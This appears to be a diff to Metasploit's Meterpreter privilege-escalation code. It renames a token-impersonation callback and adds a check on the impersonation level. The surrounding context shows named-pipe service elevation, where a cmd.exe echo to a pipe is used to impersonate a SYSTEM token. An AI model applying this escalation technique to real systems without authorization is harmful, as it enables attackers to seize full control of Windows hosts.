@@ -7,14 +7,26 @@
  * A post-impersonation callback that simply updates the meterpreter token to the
  * current thread token. This is used by the standard service-based technique.
  */
-DWORD post_callback_use_self(Remote * remote)
+DWORD set_meterp_thread_use_current_token(Remote * remote)
 {
 	HANDLE hToken = NULL;
 
 	// get a handle to this threads token
 	if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken)) {
-		dprintf("[ELEVATE] post_callback_use_self. OpenThreadToken failed");
+		dprintf("[ELEVATE] set_meterp_thread_use_current_token. OpenThreadToken failed");
 		return GetLastError();
+	}
+
+	DWORD dwLevel, dwSize;
+	if (!GetTokenInformation(hToken, TokenImpersonationLevel, &dwLevel, sizeof(dwLevel), &dwSize)) {
+		dprintf("[ELEVATE] set_meterp_thread_use_current_token. GetTokenInformation failed");
+		return GetLastError();
+	}
+
+	// check that the token can be used
+	if ((dwLevel == SecurityAnonymous) || (dwLevel == SecurityIdentification)) {
+		SetLastError(ERROR_BAD_IMPERSONATION_LEVEL);
+		return ERROR_BAD_IMPERSONATION_LEVEL;
 	}
 
 	// now we can set the meterpreters thread token to that of our system
@@ -164,7 +176,7 @@ DWORD elevate_via_service_namedpipe(Remote * remote, Packet * packet)
 			"cmd.exe /c echo %s > %s", cpServiceName, cServicePipe);
 
 		hSem = CreateSemaphore(NULL, 0, 1, NULL);
-		PostImpersonation.pCallback = post_callback_use_self;
+		PostImpersonation.pCallback = set_meterp_thread_use_current_token;
 		PostImpersonation.pCallbackParam = remote;
 
 		pThread = met_api->thread.create(elevate_namedpipe_thread, &cServicePipe, hSem, &PostImpersonation);
@@ -304,7 +316,7 @@ DWORD elevate_via_service_namedpipe2(Remote * remote, Packet * packet)
 		}
 
 		hSem = CreateSemaphore(NULL, 0, 1, NULL);
-		PostImpersonation.pCallback = post_callback_use_self;
+		PostImpersonation.pCallback = set_meterp_thread_use_current_token;
 		PostImpersonation.pCallbackParam = remote;
 
 		pThread = met_api->thread.create(elevate_namedpipe_thread, &cServicePipe, hSem, &PostImpersonation);
